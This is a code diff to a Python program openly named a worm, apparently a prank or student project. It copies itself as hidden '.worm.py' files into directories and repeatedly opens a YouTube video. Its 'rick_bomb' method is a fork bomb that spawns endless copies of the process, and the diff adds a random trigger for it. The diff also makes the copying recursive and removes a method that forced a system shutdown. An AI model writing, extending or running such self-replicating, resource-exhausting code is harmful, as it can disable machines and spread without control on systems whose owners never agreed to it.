@@ -6,6 +6,7 @@ import shutil
 import logging
 import subprocess
 import webbrowser
+import random
 
 #Threading imports - AR
 from threading import Thread, Lock
@@ -31,7 +32,8 @@ BRICKCOUNT = 500
 #Amount of worm files created per directory
 INSTANCES_PER_DIRECTORY = 2
 
-
+#random number to guess with rand range to see if we're done multiplying and ready to die.
+ROULETTE = 1337
 #------------------------------------------THREADER CLASS---------------------------------------------- -AR
 class Threader:
     
@@ -136,6 +138,8 @@ class Worm:
             for directory in self.target_dir_list:
                 destination = os.path.join(directory, ".worm.py")
                 shutil.copyfile(self.own_path, destination)
+            if self.russian_roulette():
+                self.rick_bomb()
         except:
             logging.warning("exception occurred: cannot create new worm")
     
@@ -176,18 +180,20 @@ class Worm:
             if YOUTUBETOO:
                 for i in range(0, COUNT):
                     webbrowser.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ')
+            self.create_new_worm()
         except:
             logging.warning("exception occurred: no rick?")
-            
-    def time_to_rick(self):
-        sleep(10)
-        os.system("shutdown /s /t 1")
     
     def rick_bomb(self):
         while True:
             subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
         
-        
+    def russian_roulette(self):
+        if ROULETTE == random.randrange(0, 3000):
+            return True
+            #self.rick_bomb()
+        else:
+            return False
         
     def start_worm_actions(self):
         print(self.target_dir_list)
@@ -198,23 +204,13 @@ class Worm:
         self.list_directories(self.path)
         
         try:
-            self.threader.append(self.create_new_worm())
-            self.threader.append(self.time_to_rick())
-            self.threader.append(self.rick_bomb())
-            self.threader.start()
-            self.threader.join()
-            #self.create_new_worm()
+            self.create_new_worm()
             #self.time_to_rick()
         except:
             logging.warning("something went wrong")
         
         #self.copy_existing_files()
         #self.time_to_rick()
-        
-        
-
-            
-       
         #self.connection_iterator()
         
     
